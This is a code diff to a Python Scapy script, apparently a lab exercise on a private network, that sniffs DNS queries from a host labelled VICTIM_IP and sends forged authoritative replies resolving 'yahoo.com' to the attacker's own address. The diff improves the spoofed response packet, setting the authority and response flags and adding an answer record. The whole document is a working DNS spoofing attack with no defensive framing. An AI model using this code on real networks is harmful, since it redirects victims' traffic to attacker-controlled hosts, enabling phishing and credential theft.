@@ -2,29 +2,36 @@
 
 from ntpath import join
 from socket import timeout
+from struct import pack
 from scapy.all import *
-from scapy.layers.inet import IP, UDP, TCP, ICMP 
+from scapy.layers.inet import IP, UDP, TCP, ICMP
 from scapy.layers.dns import *
 import sys
 
-THIS_IP = "192.168.50.128"
-VICTIM_IP = "192.168.50.129"
+THIS_IP = "192.168.100.129"
+VICTIM_IP = "192.168.100.128"
 
 #packet_filt = " and ".join([
 #"udp dst port 53", # dns port filtering
 #"udp[10] & 0x80 = 0", # dns only
 #"src host 192.168.59.3"]) # ip source	
 
-packet_filter = f"udp port 53 and ip dst {THIS_IP} and ip src {VICTIM_IP}"
+packet_filter = f"udp port 53 and ip src {VICTIM_IP}"
 
 
 def dns_reply(packet): 
 	print("received")
+	
+	if not packet.haslayer(UDP):
+		return
+	print("name is: ",packet[DNS].qd.qname)
+	if packet[DNS].qd.qname != b'yahoo.com.':
+		return
 	packet.show()
-	send(
-	IP(dst="192.168.50.129", src=THIS_IP)/
-	UDP(dport=packet[UDP].sport, sport=53)/
-	DNSRR(rrname=packet[DNS].name, rdata=THIS_IP))
+	returnPack = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(qd=packet[DNS].qd,arcount=1,aa=1,qr=1 ,ar=DNSRR(ttl=100, rrname=packet[DNS].qd.qname, rdata=THIS_IP))
+	print("sending: ")
+	returnPack.show()
+	sendp(returnPack, iface="ens33")
 
 print(packet_filter)
 print("started sniffing")
